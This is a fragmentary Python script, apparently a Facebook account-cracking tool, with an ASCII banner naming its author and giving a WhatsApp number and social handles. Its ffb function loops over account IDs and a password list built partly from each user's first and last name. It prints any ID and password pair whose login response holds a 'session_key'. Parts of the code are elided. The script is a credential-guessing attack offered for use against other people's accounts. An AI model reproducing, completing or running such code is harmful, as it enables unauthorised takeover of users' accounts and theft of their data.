...
os.system('xdg-open https://www.facebook.com/profile.php?id=100074429072988')
...
| $$  \$ | $$| $$  | $$
 \$$      \$$ \$$   \$$
                       ...
                       {BLUE}X {mhbwbalala}PATHANI {WHITE}

\t[×] Developed By MA {EXTRA} (Mhbwb)
{WHITE}[•] AUTHOR       : Mhbwb
{WHITE}[•] STYLE         : Mhbwb Lala
{WHITE}[•] WhatsApp     :   +93786518830
[•] FaceBook     :   Mhbwb AFG
[•] Version      :   {RED}0.7
{WHITE}[•] YouTube      :   Mhbwb Tech

{WHITE}================================================
   \33[37;41m\t Mhbwb  x Mhbwb  x AFG \33[0;m
{WHITE}=================================================""")
def linex():
    print('\033[1;37m----------------------------------------------')
def clear():
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [king-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [LEGEND-king-OK] '+ids+' | '+pas+'\033[1;97m')
